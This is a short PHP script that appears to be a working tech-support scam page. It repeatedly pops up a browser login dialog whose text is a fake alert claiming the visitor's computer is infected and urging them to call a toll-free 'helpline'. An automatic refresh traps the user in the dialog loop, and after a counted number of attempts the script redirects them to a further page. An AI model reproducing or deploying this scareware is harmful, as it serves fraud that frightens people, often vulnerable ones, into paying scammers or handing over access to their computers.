<?php

    session_start();

    $_uy = 'dsdsj';
    $_py = 'bgrfd';

    if ($_SERVER['PHP_AUTH_USER'] != $_uy || $_SERVER['PHP_AUTH_PW'] != $_py ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 70){
            header('Location: IE1010101helpS.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="Suspicious movement distinguished on your IP address because of destructive infection introduced in your PC. Call Toll Free now @ +1-888-984-4462 for any help. Your information is at a genuine risk.There is a Computer framework record missing because of some harmfull infection Debug malware blunder, framework disappointment. It would be ideal if you contact experts to correct the issue. Please do not open web program for your security issue to maintain a strategic distance from information debasement on your working framework. If its not too much trouble contact Computer experts at Tollfree Helpline at @ +1-888-984-4462 PLEASE DO NOT SHUT DOWN OR RESTART YOUR COMPUTER, DOING THAT MAY LEAD TO DATA LOSS AND FAILIURE OF OPERATING SYSTEM , HENCE NON BOOTABLE SITUATION RESULTING COMPLETE DATA LOSS . CONTACT ADMINISTRATOR DEPARTMENT TO RESOLVE THE ISSUE ON TOLL FREE @ +1-888-984-4462."');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title></title></head><body>";


            exit;
        }
    } else {

        header('Location: IE1010101helpS.php');

        exit;
    }
?>
